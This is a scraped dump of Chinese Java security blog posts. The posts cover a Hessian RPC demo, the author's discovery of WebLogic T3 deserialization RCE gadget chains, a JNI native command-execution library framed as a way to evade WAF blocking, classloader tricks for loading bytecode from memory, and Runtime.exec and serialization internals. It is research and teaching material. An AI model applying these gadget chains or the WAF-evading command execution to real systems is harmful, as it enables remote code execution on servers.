&lt;init-param&gt; &lt;param-name&gt;service-class&lt;/param-name&gt; &lt;param-value&gt;org.syclover.hessian.BasicService&lt;/param-value&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;HessianServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/api/service&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 代码忘记从网上哪里copy的了，侵删。 client/server端共有代码 1234567891011121314package org.syclover.hessian;public interface IBasicApi { /* 设置用户名 */ public boolean setUserName(String name); /* 获取问候 */ public String sayHello(); /* 获取用户信息 */ public User getUser();} client端代码 12345678910111213141516171819package org.syclover.hessian;import com.caucho.hessian.client.HessianProxyFactory;import java.net.MalformedURLException;public class ClientTest { public static void main(String[] args) throws MalformedURLException { String url = \"http://localhost:8080/hessianTest_war_exploded/api/service\"; HessianProxyFactory factory = new HessianProxyFactory(); IBasicApi api = (IBasicApi) factory.create(IBasicApi.class, url); api.setUserName(\"mahc\"); System.out.println(api.sayHello()); System.out.println(api.getUser().getName()); System.out.println(api.getUser().getAge()); }} server端代码 123456789101112131415161718192021222324package org.syclover.hessian;import org.syclover.hessian.User;public class BasicService implements IBasicApi { private String name; @Override public boolean setUserName(String name) { this.name = name; return false; } @Override public String sayHello() { return \"Hello \" + name + \",Welcome to Hessian!\"; } @Override public User getUser() { return new User(name, 23); }} 123456789101112131415161718192021222324252627282930313233343536package org.syclover.hessian;import java.io.Serializable;public class User implements Serializable { private String name; private Integer age; public User() { super(); } public User(String name, Integer age) { super(); this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; }} 这里为了测试方便把c/s放到一起了 进行RPC 参考Hessian使用教程JVM 类装载原理分析－ClassLoader原理分析hessian 序列化实现 初探","link":"/2020/01/03/Hessian-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E5%AD%A6%E4%B9%A0/"},{"title":"How Did I Find Weblogic T3 RCE","text":"文章首发于先知社区​获得噱头oracle公开致谢 之前这个补丁没有修好，有CVE-2021-2135和CVE-2021-2136两种绕过。挖不动，把之前思路再发出来，等下个补丁日向师傅们学习了。 CASE 1最初引起我注意的是ExternalizableLite#readExternalizableLite，可以看到这里直接从数据流里面读取了类名并新建对象。下面又会调用value自身的readExternal((DataInput)in)方法。新建出来的对象会调用自己的readExternal。当对象构造好之后又会在realize中调用readResolve方法结合这里三点来看，相当于是一个免黑名单检查的反序列化场景。我们只需要往上回朔，看能否到反序列化的入口点就行了。 然后全局搜com.tangosol.util.ExternalizableHelper#readObject(java.io.DataInput)，可以在很多类的readExternal(java.io.DataInput)中看到这样的调用。回朔到这一步的时候我还以为成了，但是测了一下发现，在反序列化的时候java根本不会调用这个方法。因为这里函数的签名是readExternal(java.io.DataInput)而不是正统的readExternal(java.io.ObjectInput)。 有些不甘心，于是乎把coherence.jar里面的readExternal(java.io.ObjectInput)全部抓了出来。 123456789101112com.oracle.common.internal.util.Histogramcom.tangosol.util.MapSetcom.tangosol.util.Binarycom.tangosol.util.LiteSetcom.tangosol.util.UUIDcom.tangosol.util.LiteMapcom.tangosol.run.xml.SimpleDocumentcom.tangosol.run.xml.XmlBeancom.tangosol.util.ConcurrentMap$1com.tangosol.coherence.component.net.Membercom.tangosol.net.security.PermissionInfocom.tangosol.coherence.mvel2.util.FastList 数量不是很多，一个一个手工看。很快啊，我啪一下就点到com.oracle.common.internal.util.Histogram#readExternal(java.io.ObjectInput)里面了。这个地方有强制类型转换，那么刚才的链路不就续上了？继续跟进，再一次失望，发现这里只读取长整型，并没有调用readObject。 然后接下来的所有类要么是转换成了DataInput但是没有readObject。要么是根本就没有强制转换。 还是不甘心，又看了一遍，在com.tangosol.net.security.PermissionInfo#readExternal(java.io.ObjectInput)处事情出现转机。我发现在调用readCollection的时候传入的ObjectInput in会被隐式转换成DataInput in，并且里面刚好有readObject。 到这里一条从readExternal(java.io.ObjectInput) 到无视黑名单的反序列化路线在理论上似乎已打通，接下来的就是gadget后半段是选择，立马想到的是TemplatesImpl和RemoteConstructor（CVE-2020-14644）。我选择了后者，把payload构造好，再打上10月补丁（感谢给我补丁的师傅）一发入魂。 ps：这里readExternal(java.io.ObjectInput) -&gt; 无视黑名单的readObject的结论是不严谨的，选择TemplatesImpl也是打不通的，这个原因后面会解释。确实很尴尬，虽然能RCE，但是当时急于验证并未全流程调试过，对这个洞的理解比较片面。 至此第一个洞就结束了，当晚就给官方提漏洞。后面的几天我在反思这个洞， 为什么我能挖到？我想我能挖到原因是weblogic官方没有bug bounty前人可能没有注意到有进入到readExternal(DataInput in)通路。 为什么readExternal(ObjectInput in)可以续上？我想因为readExternal本来就是给程序员自定义反序列化数据的地方，而readExternal(DataInput in)里面是coherence自己的反序列化逻辑，所以从ObjectInput in能到DataInput in算是题中应有之义。 这种反序列化绕过方式属于哪种类型？我想应该是二阶反序列化类型。 CASE 2几天后，我收到了官方回复的邮件，从它们回复中可以看到它们把这个链关键认定为RCE involving LambdaIdentity。此时，我觉得很奇怪难道后半段不是可以灵活吗？如果我重新找一个新入口配上7u21后半段岂不是能再混一个CVE？。然后抓了一下整个coherence lib目录下的所有jar包的readExternal(java.io.ObjectInput) 。 1234567891011121314com.oracle.common.internal.util.Histogramcom.tangosol.util.MapSetcom.tangosol.util.Binarycom.tangosol.util.LiteSetcom.tangosol.util.UUIDcom.tangosol.util.LiteMapcom.tangosol.run.xml.SimpleDocumentcom.tangosol.run.xml.XmlBeancom.tangosol.util.ConcurrentMap$1com.tangosol.coherence.component.net.Membercom.tangosol.net.security.PermissionInfocom.tangosol.coherence.mvel2.util.FastListcom.tangosol.coherence.servlet.AbstractHttpSessionModelcom.tangosol.coherence.servlet.AttributeHolder 倒数两个是比上次只跑conherence.jar多出来的，经过验证在conherence-web.jar中的com.tangosol.coherence.servlet.AttributeHolder满足条件。把TemplatesImpl打到m_Value之后，发送payload后发现控制台报错。发生肾么事了？我一看，哦原来啊是没过黑名单，这就引起了对这个漏洞细节的进一步探究。在com.tangosol.util.ExternalizableHelper#readObjectInternal下断点可以看到它并没进入，预期的readExternalizableLite而是进入了readSerializable中在readObject中DataInput in会重新“转换”回带黑名单的InputStream，所以失败。此时，心理又有两个疑问 输入流为我所控，那我把nType改成10，强行进入readExternalizableLite行不行？ 为什么RemoteConstructor可以打成功？ 首先回答第一个问题，可以但是行不通，就算真的把TemplatesImpl new出来了之后的强转也过不了。其次，就算真的成功他也没有readExternal方法（即没有实现ExternalizableLite接口）。到这里RemoteConstructor可以打的原因也很明显了RemoteConstructor实现了ExternalizableLite接口。所以这个攻击面的利用条件是： 一个java.io.ObjectInput强转成java.io.DataInput的点 强转成java.io.DataInput后需要有进行ExternalizableHelper.readObject的操作 一个实现了ExternalizableLite的接口高危类 不过这已经足够了，因为conherence里面的Extractor都实现这个接口。 一开始，我其实是想手工挖的，那段时间真的是看的我头皮发麻，而且因为实现了ExternalizableLite接口是在是太多也很难保证自己完全不重不漏，大多数readExternal里面都只有赋值没有别的操作，休息了几天后我决定用魔法打败魔法，拿之前写的自动化工具跑。结合历史漏洞我决定以readExternal(DataInput in)为source，以com.tangosol.util.extractor.AbstractExtractor#compare为sink开动化跑。 跑了一会，从一堆误报中看到了希望的曙光。最后证明了这个确实可行。 CASE 3在手工看的那段时间，虽然头皮发麻但并不是没有收获，看了几个版本的weblogic经历了“卧槽,这里怕不是有洞”到”卧槽,被黑名单全防住了，全防出去了啊”很多次后，我隐约觉得coherence已经可以造成危害的点全部加入黑名单套餐了，不会有全新的链了（等被打脸），但二阶反序列化的点还有机会！ 这次引起我注意的是com.tangosol.coherence.jcache.common.CoherenceEntryProcessorResult。可以看到在反序列化时它会读一个Binary进来，然后对Binary进行一个fromBinary的操作。我注意到com.tangosol.util.ExternalizableHelper#fromByteArray中会把byte[]数组重建成BufferInput进行反序列化，因为重建所以没有黑名单过滤。 这个时候，我感觉又成了。构造好payload打过去，被weblogic防出去了。一看，是2找不到类，后面确认了一下，这个类在coherence-jcahe.jar里面，这个包并没有被weblogic加载进来。但是就这么放弃是不可能的，我决定找到其他fromBinary的调用点，这里我选择直接打开JD-GUI搜，发现SimpleBinaryEntry这个看起来品相很好，它的getValue调用了ExternalizableHelper.fromBinary方法而其toString方法又调用了getValue。 这里还有细节需要注意m_serializer是transient的，如果用BadAttributeValueExpException.readObject() -&gt; TiedMapEntry.toString()是不可行的，后续反序列化会因为m_serializer为null而失败。 所以这里还是需要以readExternal为入口进来，因为readExternal是不受transient限制的。因为走这种反序列化当对象实现了SerializerAware时会自动插入serializer。 半自动化跑了一下，虽然没有绝对跑出来（没有用指针分析），但是有一个参考已经足够了： 小结总结一下trik 在挖新的之前，可以调研历史CVE和补丁学习前人思路。 找二阶反序列化，二阶反序列化往往出现在readExternal处。二阶反序列化，既可以是标准的Byte字节流型（CVE-2016-0638），也可以是jrmp带外利用（CVE-2017-3248），还可以是一些变种比如这里的cve-2020-14756开发自实现的反序列化，甚至可以是开发在反序列化时使用了自己继承的ObjectInputStream里面但是里面重写readResolve方法（覆盖了原来的黑名单检查）。 自动化","link":"/2021/08/31/How-Did-I-Find-Weblogic-T3-RCE/"},{"title":"JAVA JNI 执行命令与调试","text":"JAVA JNI 执行命令与调试 执行命令代码基本抄自自园长的demo（为了篇幅省略了作者信息，这里统一说明一下～） JNI的好处在于底层，实战中可用绕过一些waf拦截吧。 CommandExecution.java 123public class CommandExecution { public static native String exec(String cmd);} 编译CommandExecution，并生成native层c代码需要用的头文件 12javac -cp . CommandExecution.javajavah -cp . CommandExecution CommandExecution.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include \"CommandExecution.h\"using namespace std;JNIEXPORT jstringJNICALL CommandExecution_exec (JNIEnv *env, jclass jclass, jstring str) { if (str != NULL) { jboolean jsCopy; // 将jstring参数转成char指针 const char *cmd = env-&gt;GetStringUTFChars(str, &amp;jsCopy); // 使用popen函数执行系统命令 FILE *fd = popen(cmd, \"r\"); if (fd != NULL) { // 返回结果字符串 string result; // 定义字符串数组 char buf[128]; // 读取popen函数的执行结果 while (fgets(buf, sizeof(buf), fd) != NULL) { // 拼接读取到的结果到result result +=buf; } // 关闭popen pclose(fd); // 返回命令执行结果给Java return env-&gt;NewStringUTF(result.c_str()); } } return NULL;} 编译，注意这里为了后续能够调试需要加 -g 参数 1g++ -fPIC -I\"$JAVA_HOME/include\" -I\"$JAVA_HOME/include/linux\" -shared -g -o libcmd.so CommandExecution.cpp MainTest.java 1234567public class MainTest { public static void main(String[] args) { System.load(\"/home/anonymous/Desktop/learnjni/libcmd.so\"); CommandExecution commandExecution = new CommandExecution(); System.out.println(commandExecution.exec(\"whoami\")); }} 12javac MainTest.javajava MainTest 调试调试需要同时安装JetBrain家的idea和clion，并且clion要以管理员权限（sudo）启动。 在调用native层的地方打断点 通过jps找到所运行的java类对应的类的编号 在clion选择Run-&gt;Attach to Process 然后attach到响应编号上 在下断点地方步入 步过findNative后就会跳转到clion里面然后就可以愉快的调试了～ 参考recipeNoD002 - Debugging JNI code with IntelliJ/CLionIntellJ IDEA中JNI单步调试指南JNI安全基础","link":"/2019/12/31/JAVA-JNI-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E8%B0%83%E8%AF%95/"},{"title":"Java中双亲委派相关知识梳理","text":"classloader介绍在java中每当需要加载一个类的时候，就需要用到类加载器（classloader），它存在的意义在于把class文件中字节码变成可以被java使用的class对象。java中原生自带3个classloader分别是Bootstrap ClassLoader、Ext ClassLoader、App ClassLoader另外用户也可以自定义Custom ClassLoader。那实际加载类的时候是用哪一个加载器？java为了安全着想规定了classloader之间有一套等级机制。具体来说就是：当从子加载器出发，但子加载器加载class的时候会先委派给由父加载器先加载，如果父加载器无法加载再由子加载器加载，而这套先后顺序就是平时所说的双亲委派。 BootstrapClassLoader，启动类加载器/根加载器，负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.. 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。 ExtClassLoader，扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，库名通常以 javax 开头。 AppClassLoader，应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。 容易误会的一点是Classloader之间并不是继承关系而是组合。 AppClassLoader和ExtClassLoader都继承自URLClasLoader。 URLClassLoader继承自ClassLoader。 而一般自定义加载器是直接继承ClassLoader并根据需求重写findClass或者loadClass方法（之后会提到）。 在java代码我们可以调用getParent的方法获取该加载器的父加载器。 12345678910111213public class JavaClassLoader { public static void main(String[] args) { ClassLoader appClassloader = ClassLoader.getSystemClassLoader(); ClassLoader extensionClassloader = appClassloader.getParent(); System.out.println(\"AppClassLoader is \" + appClassloader); System.out.println(\"The parent of AppClassLoader is \" + extensionClassloader); System.out.println(\"The parent of ExtensionClassLoader is \" + extensionClassloader.getParent()); }}//console ouput:////AppClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2////The parent of AppClassLoader is sun.misc.Launcher$ExtClassLoader@61bbe9ba////The parent of ExtensionClassLoader is null ps: 因为BootstrapClassLoader是内嵌到jvm中c代码，开发者无法直接获取，因此ExtensionClassLoader.getParent()会返回null。_demo代码 12345678910import java.io.*;import java.lang.reflect.InvocationTargetException;public class Main { public static void main(String[] args) throws IOException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException { Test test = new Test(); }} 在new 的位置强制进入，可以看到是从确实是从子加载器AppClassLoader开始的。 步入两步后在第一个红框可以看到加载双亲委派的逻辑。 如果父类无法加载，那么使用自己的findClass实现来找。这里Test是我自定义的因此不在JAVA_HOME/lib/rt.jar也不在 JAVA_HOME/lib/ext/*.jar中，所以最后会使用AppClassLoader的findClass实现，而AppClassLoader没有实现自己的findClass，所以最后是由URLClassLoader findClass寻找类。最后通过deineClass把字节码转换为类对象。 重写ClassLoader通过上面分析我们可以看到在第一次加载类时是在loadClass进行loader调度（实现双亲委派逻辑），最后由findClass拿到路径Resource，由defineClass加载类。因此，如果我们把自己的class放在不常规的位置，就需要自定义ClassLoader，重写findClass方法。如果我们想突破双亲委派模型（覆盖系统类）就需要重写loadClass。 而实际应用中处于bypass的需要我们经常使用defineClass一个多态实现来从内存中或者文件中执行命令。看下面代码。 从内存中 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import java.lang.reflect.Method;/** * Creator: yz * Date: 2019/12/17 */public class TestClassLoader extends ClassLoader { // TestHelloWorld类名 private static String testClassName = \"com.anbai.sec.classloader.TestHelloWorld\"; // TestHelloWorld类字节码 private static byte[] testClassBytes = new byte[]{ -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12 }; @Override public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException { // 只处理TestHelloWorld类 if (name.equals(testClassName)) { // 调用JVM的native方法定义TestHelloWorld类 return defineClass(testClassName, testClassBytes, 0, testClassBytes.length); } return super.findClass(name); } public static void main(String[] args) { // 创建自定义的类加载器 TestClassLoader loader = new TestClassLoader(); try { // 使用自定义的类加载器加载TestHelloWorld类 Class testClass = loader.loadClass(testClassName); // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld(); Object testInstance = testClass.newInstance(); // 反射获取hello方法 Method method = testInstance.getClass().getMethod(\"hello\"); // 反射调用hello方法,等价于 String str = t.hello(); String str = (String) method.invoke(testInstance); System.out.println(str); } catch (Exception e) { e.printStackTrace(); } }} 从文件中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.InputStream;import java.util.Arrays;public class MyClassLoader extends ClassLoader{ private String classpath; public MyClassLoader(String classpath) { this.classpath = classpath; } @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException { try { byte[] classDate = getClassBinaryData(name); //System.out.println(Arrays.toString(classDate)); if (classDate == null) { } else { // defineClass方法将字节码转化为类 return defineClass(name, classDate, 0, classDate.length); } } catch (IOException e) { e.printStackTrace(); } return super.findClass(name); } // 返回类的字节码 private byte[] getClassBinaryData(String className) throws IOException { InputStream in = null; ByteArrayOutputStream out = null; String path = classpath + File.separatorChar + className.replace('.', File.separatorChar) + \".class\"; try { in = new FileInputStream(path); out = new ByteArrayOutputStream(); byte[] buffer = new byte[2048]; int len = 0; while ((len = in.read(buffer)) != -1) { out.write(buffer, 0, len); } return out.toByteArray(); } catch (FileNotFoundException e) { e.printStackTrace(); } finally { in.close(); out.close(); } return null; }} 参考Java动态类加载，当FastJson遇到内网Idea中那些鲜为人知的调试技巧Java虚拟机–类加载器源码","link":"/2020/01/22/Java%E4%B8%AD%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"},{"title":"Java Runtime.getRuntime().exec由表及里","text":"本文发在先知社区，转载到自己博客上。 问题复现测试代码如下 1234567891011121314151617181920import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class linux_cmd1 { public static void main(String[] args) throws IOException { String cmd = \"cmd which you want to exec\"; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 先看看可以成功的情况 再来看看不能成功的情况 这里 &amp;&amp; 并没有达到bash中的效果 如果以前有人问我为什么会出现这种，我会毫不犹豫的回答：因为 Runtime.getRuntime().exec 执行命令的时候并没有shell上下文环境所以无法把类似于 &amp; | 这样的符号进行特殊处理。 解决方法解决这种问题的方法有两种第一种就是对执行命令进行编码，编码地址在这 第二种就是使用数组的形式命令执行 12String[] command = { \"/bin/sh\", \"-c\", \"echo 2333 2333 2333 &amp;&amp; echo 2333 2333 2333\" };InputStream in = Runtime.getRuntime().exec(command).getInputStream(); 至此从实战应用的角度这个问题已经解决了。 不过我们可以看到其实这第二种方法用到了 &amp; 上面 _Runtime.getRuntime().exec执行命令的时候并没有shell上下文环境所以无法把类似于 &amp; | `_ _这样的符号特殊处理。_这一结论似乎看起来并站不住脚? 下面来跟踪一下源码，看看到底发生了什么。 源码分析当传入Runtime.getRuntime().exec的是字符串1234567891011121314151617181920import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class linux_cmd1 { public static void main(String[] args) throws IOException { String cmd = \"echo 2333 &amp;&amp; echo 2333\"; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 因为传入的命令是String类型，所以进入 java.lang.Runtime#exec(java.lang.String, java.lang.String[], java.io.File) 。这里是第一个非常关键的点， StringTokenizer 会把传入的conmmand字符串按 \\t \\n \\r \\f 中的任意一个分割成数组cmdarray。 代码来到exec的多态实现 java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File) ，exec内部调用了ProcessBuilder的start。 ProcessBuilder.start内部又调用了ProcessImpl.start。 在ProcessImpl.start中有第二个非常关键的点我们可以看到程序把cmdarray第一个参数（cmdarray[0]）当成要执行的命令，把其后的部分（cmdarray[1:]）作为命令的参数转换成byte 数组 argBlock（具体规则是以\\x00进行implode）。 ProcessImpl.start最后又会把处理好的参数传入UNIXProcess UNIXProcess内部又调用了forkAndExec方法 这里的是forkAndExec是一个native方法。 从变量的命名来看，在开发者的眼中prog是要执行的命令即 echo ，argBlock都是传给 echo 的参数即2333\\x00&amp;&amp;\\x002333且传给 echo 的参数个数argc是4可见经过StringTokenizer对字符串中空格类的处理其实是一种java对命令执行的保护机制，他可以防御以下这种命令注入。 12String cmd = \"ping \" + 可控点;Runtime.getRuntime().exec(cmd) 补一个完整的调用栈。 当传入Runtime.getRuntime().exec的是字符串数组我们再来看看给Runtime传入数组的时候是什么情况。 1234567891011121314151617181920import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class linux_cmd1 { public static void main(String[] args) throws IOException { String[] command = { \"/bin/sh\", \"-c\", \"echo 2333 &amp;&amp; echo 2333\" }; InputStream in = Runtime.getRuntime().exec(command).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 因为这里传入的数组，所以并没有经StringTokenizer对字符串的分割处理这一步而是直接进入了。java.lang.Runtime#exec(java.lang.String[]) 。 后面的流程和字符串的情形是一致的，最后来到forkAndExec 按照上面的说法这里 /bin/bash 是要执行的命令， -c\\x00&quot;echo 2333 &amp;&amp; echo 23333&quot; 是传给的 /bin/bash 的参数。 补一个调用栈 一个错误的想法看到这里不知道你是不是有点晕，心底生出了疑问，在执行字符串的时候加上 /bin/bash 不就好了。像下面这样。 12345678910111213141516171819import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class linux_cmd1 { public static void main(String[] args) throws IOException { String cmd = \"/bin/bash -c 'echo 2333 &amp;&amp; echo 2333'\"; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 运行试试看，发现什么结果都没有，推测应该是shell执行命令失败了。 为什么会失败呢？我们来diff一下和数组执行最后进native的层的区别。可以看到prog都是 /bin/bash 但是字符串模式下执行的参数变成了 -c\\x00'echo\\x002333\\x00&amp;&amp;\\x00echo\\x002333' ，对比数组模式 -c\\x00&quot;echo 2333 &amp;&amp; echo 23333&quot; 。可以发现字符串模式下因为StringTokenizer对字符串空格类字符的处理破坏了命令执行的语义。 如果再仔细看看会发现字符串模式argc为6而数组模式只有2。写到这里其实我还想钻以下牛角尖，凭什么6个参数最后就不能执行？ 进入jvm看看带着这样的疑问，我自不量力的编译了java源码并现学了一下怎么调试jvm（调试的环境是ubuntu14.04+jdk8）下面是学习成果。 1234567891011121314151617181920import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class Test { public static void main(String[] args) throws IOException { String[] command = { \"/bin/bash\", \"-c\", \"echo 2333 &amp;&amp; echo 2333\" }; InputStream in = Runtime.getRuntime().exec(command).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 根据java native函数命名规则可以知道forkAndExec对应的c函数是 Java_java_lang_UNIXProcess_forkAndExec 。 这个函数初始化执行命令所需要一些变量（如输入输出错误流）以及提取并处理java传入进来的参数，最后调用startChild函数开启子进程。 startChild会根据是mode的数值不同进入不同的分支，mode由操作系统、libc版本决定。 我这里进入了vforkChild，vforkChild会使用vfork开启一个子进程，并且在子进程内部调用了childProcess，在clion中为了调试进入子进程需要在进入之前在gdb调试框输入 set follow-fork-mode child 和 set detach-on-fork off childProcess中调用JDK_execvpe。JDK_execvpe最后调用系统execvp函数，我们来细一看传参情况。 故数组情况下等价于 那么我们再来考察一下，字符串的情况的情况。 故字符串模式等价于 12345int main() { const char *arg[] = {\"/bin/bash\", \"-c\", \"'echo\", \"2333\", \"&amp;&amp;\", \"echo\", \"2333'\", NULL}; execvp(arg[0],(char **) arg); return 0;} 所以整个调用链如下 123456java.lang.Runtime.exec(cmd);-&gt;java.lang.ProcessBuilder.start();--&gt;java.lang.ProcessImpl.start();---&gt;Java_java_lang_UNIXProcess_forkAndExec() in j2se/src/solaris/native/java/lang/UNIXProcess_md.c----&gt;fork或VFORK或POSIX_SPAWN-----&gt;execvp(); 结论_Runtime.getRuntime().exec执行命令的时候并没有shell上下文环境所以无法把类似于 &amp; | `_ _这样的符号特殊处理_的本质是execvp也确实不支持shell中的特殊符号。而之所以数组情况能成是因为execvp调用了 /bin/bash ，/bin/bash 解释了 &amp; , | 这些特殊符号和execvp没关系。 参考Java下奇怪的命令执行在 Runtime.getRuntime().exec(String cmd) 中执行任意shell命令的几种方法Java JVM、JNI、Native Function Interface、Create New Process Native Function API AnalysisHow to debug a forked child process using CLion","link":"/2020/01/11/Java-Runtime-getRuntime-exec%E7%94%B1%E8%A1%A8%E5%8F%8A%E9%87%8C/"},{"title":"Java原生序列化与反序列化代码简要分析","text":"前言写这篇文章目的主要在于进一步理解何为java原生反序列化，并且回答的几个问题。 为什么就java反序列化使用而言是反序列化类的readObject开始？ 为什么resolveClass方法可以防御反序列化？ 为什么在反序列化数据后面插入脏数据会不会影响反序列化？ ps: 碍于水平有限只会在代码表层做宏观和中观的分析，并不会深入特别底层。 测试代码序列化 12345678910111213141516171819import java.io.*;class User implements Serializable { int age = 20; int money = 100; String firstname = \"cl0und\"; String lastname = \"lisan\"; User(){ System.out.println(\"无参数构造方法\"); }}public class Serial { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectOutputStream oops = new ObjectOutputStream(new FileOutputStream(\"./serializable.txt\")); oops.writeObject(new User()); }} 反序列化 123456789101112import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class Unserial { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream oips = new ObjectInputStream(new FileInputStream(\"./serializable.txt\")); User user = (User) oips.readObject(); System.out.println(user.age); }} 序列化预处理预处理的意义是拿到类的描述符类ObjectStreamClass，后续对类的内省和写入序列化数据都由他完成或调度。 序列化数据可以看到一共有三步，首先是TC_OBJECT，其次是类的元信息，最后是类的具体数据。 第一步就写个标志头，比较简单我们下面直接从第二步开始看。 writeClassDesc在序列化对象的数据之前，首先会有一个对象类型的分类判断，这里分成四种类型来处理即null类型（TC_NULL）、handle类型（TC_REFERENCE）、代理类型（TC_PROXYCLASSDESC）、普通类型（TC_CLASSDESC）。我们这里的User是普通的类所以走最后的writeNonProxyDesc。 writeNonProxyDesc会先调用writeClassDescriptor把自己的属性信息写入，然后递归调用writeClassDesc写入父类元信息。 细看一下writeClassDescriptor，这里面会调用writeNonProxy。 最后调用writeNonProxy，在for循环里面写入属性信息。 这一段的写入如果最后用dump出来，就是下面这个样子。 writeSerialData把类属性信息写去之后，接下来就是写类属性对应的具体值了。 ps:非原生数据类型指的是字符串、数组、枚举类型、对象。_一个完整的dump如下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 4 - 0x00 04 Value - User - 0x55736572 serialVersionUID - 0xbb 67 4f fb 9b a9 d6 bb newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 4 - 0x00 04 Fields 0: Int - I - 0x49 fieldName Length - 3 - 0x00 03 Value - age - 0x616765 1: Int - I - 0x49 fieldName Length - 5 - 0x00 05 Value - money - 0x6d6f6e6579 2: Object - L - 0x4c fieldName Length - 9 - 0x00 09 Value - firstname - 